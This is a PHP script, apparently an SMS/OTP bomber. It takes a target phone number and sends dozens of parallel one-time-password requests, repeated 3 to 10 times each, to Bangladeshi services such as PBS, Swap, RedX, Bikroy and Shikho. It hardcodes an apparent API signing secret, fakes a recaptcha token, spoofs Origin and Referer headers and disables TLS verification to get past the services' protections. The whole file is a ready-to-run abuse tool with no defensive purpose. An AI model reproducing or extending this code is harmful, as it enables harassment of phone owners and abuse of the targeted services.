<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

// ১. ফোন নাম্বার ভ্যালিডেশন ও ফরমেটিং
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

$phone_11 = preg_replace('/^\+?88/', '', $phone);
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

// ২. Swap API Secret & Signature (Updated)
$swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE="; 
$swap_timestamp = time();
$swap_signature = base64_encode(hash_hmac('sha256', $phone_plus88 . $swap_timestamp, $swap_secret, true));

$api_requests = [];

// --- শপ্ন, গারিবুক, রেডএক্স, বিক্রয়, বিডিটিকিটস, শিখো, ইকরা (Untouched) ---
// [এই সার্ভিসগুলো আপনার আগের কোডের মতো একইভাবে কাজ করবে]

// ৩. PBS Fixed (Using Alpha API Endpoint)
for($i=1; $i<=5; $i++){
    $api_requests[] = [
        "name" => "pbs_$i",
        "url" => "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "method" => "POST",
        "data" => ["userPhone" => $phone_11],
        "headers" => [
            'Content-Type: application/json',
            'Origin: https://pbs.com.bd',
            'Referer: https://pbs.com.bd/',
            'Accept: application/json, text/plain, */*'
        ]
    ];
}

// ৪. Swap Fixed (Using New Secret & Correct Headers)
for($i=1; $i<=10; $i++){
    $api_requests[] = [
        "name" => "swap_$i",
        "url" => "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method" => "POST",
        "data" => ["phone" => $phone_plus88, "timestamp" => $swap_timestamp],
        "headers" => [
            'Content-Type: application/json',
            'signature: ' . $swap_signature,
            'Origin: https://swap.com.bd',
            'Referer: https://swap.com.bd/',
            'Accept: application/json, text/plain, */*'
        ]
    ];
}

// ৫. বাকি সার্ভিসগুলো যুক্ত করা (একই প্যারালাল মেথড)
// শপ্ন
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json','cookie: cuid=98a49521-6662-498f-94eb-17d71974083f']];
// গারিবুক
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"garibook_$i","url"=>"https://api.garibookadmin.com/api/v4/user/login","data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],"headers"=>['Content-Type:application/json','Origin:https://garibook.com']];
// রেডএক্স
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];
// বিক্রয় (GET)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET","headers"=>['User-Agent:Mozilla/5.0']];
// বিডিটিকিটস
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json','Host:api.bdtickets.com:20100','Origin:https://bdtickets.com']];
// শিখো
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json','Origin:https://shikho.com']];
// ইকরা (GET)
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"iqra_$i","url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,"method"=>"GET","headers"=>['Origin:https://iqra-live.com']];

// --- মাল্টি-কার্ল এক্সেকিউশন ---
$mh = curl_multi_init();
$handles = [];
foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 25);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if(isset($api['method']) && $api['method'] === "GET"){
        curl_setopt($ch, CURLOPT_POST, false);
    } else {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($api['headers'] ?? [], ['User-Agent: Mozilla/5.0']));
    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}
$running = null;
do { curl_multi_exec($mh, $running); curl_multi_select($mh); } while ($running > 0);
$final_results = [];
foreach($handles as $key => $ch){
    $res = curl_multi_getcontent($ch);
    $final_results[$api_requests[$key]['name']] = json_decode($res, true) ?: $res;
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);
echo json_encode(["status" => "success", "results" => $final_results], JSON_PRETTY_PRINT);
?>
